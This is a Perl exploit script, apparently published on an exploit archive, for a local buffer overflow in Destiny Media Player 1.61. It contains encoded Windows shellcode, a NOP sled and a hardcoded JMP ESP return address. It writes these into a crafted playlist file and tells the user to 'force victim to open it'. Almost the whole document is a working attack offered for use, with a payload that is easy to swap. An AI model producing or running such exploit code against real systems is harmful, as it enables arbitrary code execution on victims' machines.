#!/user/bin/perl
#Destiny Media Player 1.61 Local BoF Code
#Exploit Coded by : sCORPINo
#Snoop Security Researching Committe 
#originally discovered by: Encrypt3d.M!nd

# windows/exec - 142 bytes
# http://www.metasploit.com
# Encoder: x86/fnstenv_mov
# EXITFUNC=thread, CMD=calc
$shellcode =
"\x6a\x1e\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x64" .
"\xfc\xb1\x5d\x83\xeb\xfc\xe2\xf4\x98\x14\xf5\x5d\x64\xfc" .
"\x3a\x18\x58\x77\xcd\x58\x1c\xfd\x5e\xd6\x2b\xe4\x3a\x02" .
"\x44\xfd\x5a\x14\xef\xc8\x3a\x5c\x8a\xcd\x71\xc4\xc8\x78" .
"\x71\x29\x63\x3d\x7b\x50\x65\x3e\x5a\xa9\x5f\xa8\x95\x59" .
"\x11\x19\x3a\x02\x40\xfd\x5a\x3b\xef\xf0\xfa\xd6\x3b\xe0" .
"\xb0\xb6\xef\xe0\x3a\x5c\x8f\x75\xed\x79\x60\x3f\xee\x6c" .
"\x92\x9c\xe7\x39\xef\xba\x81\xd6\x24\xf0\x3a\x2d\x78\x51" .
"\x3a\x35\x6c\x75\x49\xde\xa4\x96\xe1\x35\x8b\x32\x51\x3d" .
"\x0c\x64\x4f\xd7\x6a\xab\x4e\xba\x07\x9d\xdd\x3e\x64\xfc" .
"\xb1\x5d";
$nops = "\x90" x 2052;  	 #fill the buffer
$nops2 = "\x90" x 100;		 #fill the buffer more:p
$eip = "\x65\x82\xA5\x7c";	 #7CA58265 JMP ESP
$attack = $nops.$eip.$nops.$shellcode; #sandwich
$playlist="playlist.lst";    #playlist name,chage it to anything you want
intro();

open($FILE, ">$playlist");
print $FILE $attack;
close($FILE);
print "\n\n\n$playlist created beside this exploit.\n";
print "force victim to open it with Destiny Media Player 1.61\n";
print "good luck\n\n";

sub intro{
print qq(
############################################################
##        Snoop Security Researching Committe             ##
##               www.snoop-security.com                   ##
##                    sCORPINo                            ##
## Destiny Media Player 1.61 Local BoF Code               ##
## found by:                                              ##
## http://www.milw0rm.com/exploits/7652                   ##
## special tnX to:                                        ##
## Shahriyar, Adel, Alireza, Yashar and all snoop members ##
## just run and open the playlist.lst with                ##
## Destiny Media Player.then BOOM !                       ##
############################################################
);
}